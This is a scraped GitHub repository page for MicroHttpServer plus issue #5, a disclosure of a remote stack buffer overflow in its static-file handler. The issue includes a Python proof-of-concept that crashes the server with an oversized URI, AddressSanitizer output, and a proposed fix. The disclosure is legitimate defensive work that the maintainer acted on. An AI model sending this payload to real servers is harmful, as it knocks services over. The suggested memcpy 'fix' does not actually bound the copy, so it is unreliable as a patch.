=== Content from github.com_c7cfeece_20250115_093309.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer%2Ftree%2F43985708ef5fe7677392c54e229bd22e136c2665)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer%2Ftree%2F43985708ef5fe7677392c54e229bd22e136c2665)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=starnight%2FMicroHttpServer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[starnight](/starnight)
/
**[MicroHttpServer](/starnight/MicroHttpServer)**
Public

* [Notifications](/login?return_to=%2Fstarnight%2FMicroHttpServer) You must be signed in to change notification settings
* [Fork
  24](/login?return_to=%2Fstarnight%2FMicroHttpServer)
* [Star
   51](/login?return_to=%2Fstarnight%2FMicroHttpServer)

Simple HTTP Server which implements partial HTTP 1.1

### License

[BSD-3-Clause license](/starnight/MicroHttpServer/blob/master/LICENSE.md)

[51
stars](/starnight/MicroHttpServer/stargazers) [24
forks](/starnight/MicroHttpServer/forks) [Branches](/starnight/MicroHttpServer/branches) [Tags](/starnight/MicroHttpServer/tags) [Activity](/starnight/MicroHttpServer/activity)
 [Star](/login?return_to=%2Fstarnight%2FMicroHttpServer)

 [Notifications](/login?return_to=%2Fstarnight%2FMicroHttpServer) You must be signed in to change notification settings

* [Code](/starnight/MicroHttpServer)
* [Issues
  1](/starnight/MicroHttpServer/issues)
* [Pull requests
  0](/starnight/MicroHttpServer/pulls)
* [Actions](/starnight/MicroHttpServer/actions)
* [Projects
  0](/starnight/MicroHttpServer/projects)
* [Wiki](/starnight/MicroHttpServer/wiki)
* [Security](/starnight/MicroHttpServer/security)
* [Insights](/starnight/MicroHttpServer/pulse)

Additional navigation options

* [Code](/starnight/MicroHttpServer)
* [Issues](/starnight/MicroHttpServer/issues)
* [Pull requests](/starnight/MicroHttpServer/pulls)
* [Actions](/starnight/MicroHttpServer/actions)
* [Projects](/starnight/MicroHttpServer/projects)
* [Wiki](/starnight/MicroHttpServer/wiki)
* [Security](/starnight/MicroHttpServer/security)
* [Insights](/starnight/MicroHttpServer/pulse)

# starnight/MicroHttpServer

    4398570[Branches](/starnight/MicroHttpServer/branches)[Tags](/starnight/MicroHttpServer/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[150 Commits](/starnight/MicroHttpServer/commits/43985708ef5fe7677392c54e229bd22e136c2665/) | | |
| [FreeRTOS](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/FreeRTOS "FreeRTOS") | | [FreeRTOS](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/FreeRTOS "FreeRTOS") |  |  |
| [autotest](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/autotest "autotest") | | [autotest](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/autotest "autotest") |  |  |
| [c-version](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/c-version "c-version") | | [c-version](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/c-version "c-version") |  |  |
| [py-version](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/py-version "py-version") | | [py-version](/starnight/MicroHttpServer/tree/43985708ef5fe7677392c54e229bd22e136c2665/py-version "py-version") |  |  |
| [.gitignore](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/.gitignore ".gitignore") | | [.gitignore](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/.gitignore ".gitignore") |  |  |
| [.travis.yml](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/.travis.yml ".travis.yml") | | [.travis.yml](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/.travis.yml ".travis.yml") |  |  |
| [LICENSE.md](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/LICENSE.md "LICENSE.md") | | [LICENSE.md](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/LICENSE.md "LICENSE.md") |  |  |
| [README.md](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/README.md "README.md") | | [README.md](/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
# Micro HTTP Server

It is a really simple HTTP server for prototyping.

One of the major purpose is that it can be ported on an embedded system (including micro controller unit level).

For writing Micro HTTP Server, the developer has studied [eserv](https://code.google.com/p/eserv/source/browse/) and [Tiny HTTPd](http://tinyhttpd.cvs.sourceforge.net/viewvc/tinyhttpd/tinyhttpd/).

## Demo

Get the code `git clone https://github.com/starnight/MicroHttpServer.git`.

### Python Version

It will need Python 3.2 or above.

```
cd py-version
python3 main.py
```

Open your web browser and access the URL: <http://localhost:8000>

### C Version

It will need make and GCC for building.

```
cd c-version
make
./microhttpserver
```

Open your web browser and access the URL: <http://localhost:8001>

## Directories and Files

* autotest/: Place the scripts or programs for test automation.
  + client.py: The test automation program writen in Python3 tests the Micro HTTP Server.
* py-version/: Place the Python Version Micro HTTP Server.
  + main.py: The entry point of Python Version Micro HTTP Server example.
  + app.py: The web application of Python Version Micro HTTP Server example.
  + lib/: Place the Python Version Micro HTTP Server core library.
    - server.py: The Python Version Micro HTTP Server.
    - middleware.py: The Python Version Micro HTTP Server middleware.
    - \_\_init\_\_.py: Needed when server.py and middleware.py are imported by other Python programs located in other directories.
  + static/: Place the static files: HTML, JS, Images ... , which could be access directly.
* c-version/: Place the C Version Micro HTTP Server.
  + main.c: The entry point of C Version Micro HTTP Server example.
  + app.h: The web application header file of C Version Micro HTTP Server example.
  + app.c: The web application source file of C Version Micro HTTP Server example.
  + lib/: Place the C Version Micro HTTP Server core library.
    - server.h: The header file of C Version Micro HTTP Server.
    - server.c: The source file of C Version Micro HTTP Server.
    - middleware.h: The header file of C Version Micro HTTP Server middleware.
    - middleware.c: The source file of C Version Micro HTTP Server middleware.
  + static/: Place the static files: HTML, JS, Images ... , which could be access directly.
  + Makefile: The makefile of this C Version Micro HTTP Server example.
* FreeRTOS/: Place the example of Micro HTTP Server ported on FreeRTOS.
* .travis.yml: The continuous integration build script for Travis CI.
* LICENSE.md: The BSD license file.
* README.md: This read me file.

## Reference

* [RFC 2616 HTTP/1.1](https://tools.ietf.org/html/rfc2616)
* [RFC 3875 CGI](https://tools.ietf.org/html/rfc3875)
* [Wiki FastCGI](https://en.wikipedia.org/wiki/FastCGI)
* [Netscape Server Application Programming Interface (NSAPI)](https://en.wikipedia.org/wiki/Netscape_Server_Application_Programming_Interface)
* [Django & Twisted by Amber Brown @ PyCon Taiwan 2016](https://www.youtube.com/watch?v=4b3rKZTW3WA)
* [eserv](https://code.google.com/p/eserv/source/browse/)
* [Tiny HTTPd](http://tinyhttpd.cvs.sourceforge.net/viewvc/tinyhttpd/tinyhttpd/)
* [GNU Libmicrohttpd](https://www.gnu.org/software/libmicrohttpd/)

## License

Micro HTTP Server's code uses the BSD license, see our **LICENSE.md** file.

## About

Simple HTTP Server which implements partial HTTP 1.1

### Resources

[Readme](#readme-ov-file)
### License

[BSD-3-Clause license](/starnight/MicroHttpServer/blob/master/LICENSE.md)

[Activity](/starnight/MicroHttpServer/activity)
### Stars

[**51**
stars](/starnight/MicroHttpServer/stargazers)
### Watchers

[**10**
watching](/starnight/MicroHttpServer/watchers)
### Forks

[**24**
forks](/starnight/MicroHttpServer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer&report=starnight+%28user%29)

## [Releases](/starnight/MicroHttpServer/releases)

No releases published

## [Packages 0](/users/starnight/packages?repo_name=MicroHttpServer)

No packages published

## Languages

* [C
  86.5%](/starnight/MicroHttpServer/search?l=c)
* [Python
  9.9%](/starnight/MicroHttpServer/search?l=python)
* [Makefile
  3.4%](/starnight/MicroHttpServer/search?l=makefile)
* [HTML
  0.2%](/starnight/MicroHttpServer/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a556cd64_20250115_093308.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer%2Fissues%2F5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer%2Fissues%2F5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=starnight%2FMicroHttpServer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[starnight](/starnight)
/
**[MicroHttpServer](/starnight/MicroHttpServer)**
Public

* [Notifications](/login?return_to=%2Fstarnight%2FMicroHttpServer) You must be signed in to change notification settings
* [Fork
  24](/login?return_to=%2Fstarnight%2FMicroHttpServer)
* [Star
   51](/login?return_to=%2Fstarnight%2FMicroHttpServer)

* [Code](/starnight/MicroHttpServer)
* [Issues
  1](/starnight/MicroHttpServer/issues)
* [Pull requests
  0](/starnight/MicroHttpServer/pulls)
* [Actions](/starnight/MicroHttpServer/actions)
* [Projects
  0](/starnight/MicroHttpServer/projects)
* [Wiki](/starnight/MicroHttpServer/wiki)
* [Security](/starnight/MicroHttpServer/security)
* [Insights](/starnight/MicroHttpServer/pulse)

Additional navigation options

* [Code](/starnight/MicroHttpServer)
* [Issues](/starnight/MicroHttpServer/issues)
* [Pull requests](/starnight/MicroHttpServer/pulls)
* [Actions](/starnight/MicroHttpServer/actions)
* [Projects](/starnight/MicroHttpServer/projects)
* [Wiki](/starnight/MicroHttpServer/wiki)
* [Security](/starnight/MicroHttpServer/security)
* [Insights](/starnight/MicroHttpServer/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fstarnight%2FMicroHttpServer%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fstarnight%2FMicroHttpServer%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Remote Buffer Overflow at lib/middleware.c #5

Closed

[Halcy0nic](/Halcy0nic) opened this issue
Dec 15, 2023
· 1 comment
 · Fixed by [#6](https://github.com/starnight/MicroHttpServer/pull/6)

Closed

# [Remote Buffer Overflow at lib/middleware.c](#top) #5

[Halcy0nic](/Halcy0nic) opened this issue
Dec 15, 2023
· 1 comment
 · Fixed by [#6](https://github.com/starnight/MicroHttpServer/pull/6)

## Comments

[![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=80&u=2d33594f736ed622d96b4fa6f965ab39b433b7f1&v=4)](/Halcy0nic)

Copy link

### **[Halcy0nic](/Halcy0nic)** commented [Dec 15, 2023](#issue-2042748811)

| Hi  After executing my fuzz tests, I discovered a remote stack buffer overflow in the C version of MicroHttpServer in the function uint8\_t \_ReadStaticFiles(HTTPReqMessage \*req, HTTPResMessage \*res) at lib/middleware.c, line 67:     [MicroHttpServer/c-version/lib/middleware.c](https://github.com/starnight/MicroHttpServer/blob/43985708ef5fe7677392c54e229bd22e136c2665/c-version/lib/middleware.c#L67)  Line 67 in [4398570](/starnight/MicroHttpServer/commit/43985708ef5fe7677392c54e229bd22e136c2665)   |  | memcpy(path + strlen(STATIC\_FILE\_FOLDER), uri, strlen(uri)); | | --- | --- |      Any server or embedded application that utilizes MicroHttpServer is potentially at risk of remote code execution. I've included reproduction steps in the following sections. Makefile Modifications The following modifications were made to the Makefile to compile the server with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the stack buffer overflow:  ``` PROJ=microhttpserver  CC=gcc INCLUDES=-Ilib DEFS=-D_PARSE_SIGNAL_ -D_PARSE_SIGNAL_INT_ -DDEBUG_MSG -DENABLE_STATIC_FILE=1 CFLAGS=-Os -Wall -fsanitize=address -g SRCS=main.c app.c lib/server.c lib/middleware.c  all: 	$(CC) $(SRCS) $(INCLUDES) $(DEFS) $(CFLAGS) -o $(PROJ)  clean: 	rm -rf *.out *.bin *.exe *.o *.a *.so *.list *.img test build $(PROJ)  ``` Proof of Concept Python3 Script Save the following script to a file named poc.py:  ``` #!/usr/bin/env python3  import socket  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(("localhost", 8001)) sock.send(b"GET /"+b"%s"*5000+b" HTTP/1.1\r\nHost:localhost:8001\r\n\r\n") response = sock.recv(4096) sock.close()  ``` Starting MicroHttpServer ``` $ ./microhttpserver   ``` Execute our Python3 Script ``` $ python3 poc.py  ``` Address Sanitizer Output The following output is produced by address sanitizer, confirming the existence of the stack buffer overflow:  ``` Listening Accept 1 client.  127.0.0.1:35914         Parse Header         Parse body ================================================================= ==268450==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc75d79c90 at pc 0x7f141a66dcbf bp 0x7ffc75d79b50 sp 0x7ffc75d79310 WRITE of size 10001 at 0x7ffc75d79c90 thread T0     #0 0x7f141a66dcbe in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:899     #1 0x5632c9deeb74 in _ReadStaticFiles lib/middleware.c:67     #2 0x5632c9deef9b in Dispatch lib/middleware.c:138     #3 0x5632c9dee12b in _HTTPServerRequest lib/server.c:316     #4 0x5632c9dee12b in _HTTPServerRequest lib/server.c:308     #5 0x5632c9dee4e8 in HTTPServerRun lib/server.c:350     #6 0x5632c9dec3c9 in main /home/kali/projects/fuzzing/MicroHttpServer/c-version/main.c:27     #7 0x7f141a4456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58     #8 0x7f141a445784 in __libc_start_main_impl ../csu/libc-start.c:360     #9 0x5632c9dec460 in _start (/home/kali/projects/fuzzing/MicroHttpServer/c-version/microhttpserver+0x2460) (BuildId: 39e1eff8cc6e7225cc4b4972fb5564788133b49d)  Address 0x7ffc75d79c90 is located in stack of thread T0 at offset 288 in frame     #0 0x5632c9dee8a3 in _ReadStaticFiles lib/middleware.c:36    This frame has 2 object(s):     [48, 127) 'header' (line 47)     [160, 288) 'path' (line 45) <== Memory access at offset 288 overflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:899 in __interceptor_memcpy Shadow bytes around the buggy address:   0x7ffc75d79a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7ffc75d79a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7ffc75d79b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1   0x7ffc75d79b80: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 07 f2 f2   0x7ffc75d79c00: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x7ffc75d79c80: 00 00[f3]f3 f3 f3 00 00 00 00 00 00 00 00 00 00   0x7ffc75d79d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7ffc75d79d80: 00 00 f1 f1 f1 f1 00 00 f2 f2 00 00 00 00 00 00   0x7ffc75d79e00: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00   0x7ffc75d79e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f3 f3   0x7ffc75d79f00: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==268450==ABORTING   ``` Impact  * [Remote Code Execution](https://www.cloudflare.com/learning/security/what-is-remote-code-execution/) * [Denial of Service](https://attack.mitre.org/techniques/T0814/)  Mitigation The issue here is that memcpy is copying the value of 'uri' to 'path+srlen(STATIC\_FILE\_FOLDER)', but the size of the uri is larger than the destination buffer.  Buffer overflow vulnerability:  ``` memcpy(path + strlen(STATIC_FILE_FOLDER), uri, strlen(uri));  ```  This can be modified to prevent a buffer overflow:  ``` memcpy(path + strlen(STATIC_FILE_FOLDER), uri, strlen(path) + strlen(STATIC_FILE_FOLDER));  ``` References  * [Buffer Overflow (CWE-121)](https://cwe.mitre.org/data/definitions/121.html) * [OWASP Buffer Overflow Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow) * [Address Sanitizer](https://github.com/google/sanitizers/wiki/AddressSanitizer) |
| --- | --- | --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[starnight](/starnight)
added a commit
that referenced
this issue
[Dec 18, 2023](#ref-commit-2e5ff86)
[![@starnight](https://avatars.githubusercontent.com/u/2100946?s=40&u=257966a0d1ad7de94bf3d81aa5b4f771e84a230e&v=4)](/starnight)

`[Fix static file path's potential buffer overflow bug](/starnight/MicroHttpServer/commit/2e5ff86102a973a1e3f7bedefd3bcf9bd510a9ca "Fix static file path's potential buffer overflow bug

Fixes: #5")`
…

`[2e5ff86](/starnight/MicroHttpServer/commit/2e5ff86102a973a1e3f7bedefd3bcf9bd510a9ca)`

```
Fixes: [#5](https://github.com/starnight/MicroHttpServer/issues/5)
```

[![@starnight](https://avatars.githubusercontent.com/u/2100946?s=40&u=257966a0d1ad7de94bf3d81aa5b4f771e84a230e&v=4)](/starnight)
[starnight](/starnight)
mentioned this issue
[Dec 18, 2023](#ref-pullrequest-2046861588)

[Fix static file path's potential buffer overflow bug
#6](/starnight/MicroHttpServer/pull/6)
 Merged

[![@starnight](https://avatars.githubusercontent.com/u/2100946?s=40&u=257966a0d1ad7de94bf3d81aa5b4f771e84a230e&v=4)](/starnight)
[starnight](/starnight)
closed this as [completed](/starnight/MicroHttpServer/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#6](/starnight/MicroHttpServer/pull/6)
[Dec 18, 2023](#event-11277981446)

[![@starnight](https://avatars.githubusercontent.com/u/2100946?s=80&u=257966a0d1ad7de94bf3d81aa5b4f771e84a230e&v=4)](/starnight)

Copy link

Owner

### **[starnight](/starnight)** commented [Dec 18, 2023](#issuecomment-1860735969) • edited Loading

| Thanks for the bug report! |
| --- |

All reactions

Sorry, something went wrong.

[![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=40&u=2d33594f736ed622d96b4fa6f965ab39b433b7f1&v=4)](/Halcy0nic)
[Halcy0nic](/Halcy0nic)
mentioned this issue
[Dec 25, 2023](#ref-issue-2055264054)

[Remote buffer overflow in lib/server.c
#8](/starnight/MicroHttpServer/issues/8)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fstarnight%2FMicroHttpServer%2Fissues%2F5)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging a pull request may close this issue.

 [Fix static file path's potential buffer overflow bug](/starnight/MicroHttpServer/pull/6)
 [starnight/MicroHttpServer](/starnight/MicroHttpServer)

2 participants

[![@starnight](https://avatars.githubusercontent.com/u/2100946?s=52&v=4)](/starnight) [![@Halcy0nic](https://avatars.githubusercontent.com/u/42481692?s=52&v=4)](/Halcy0nic)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


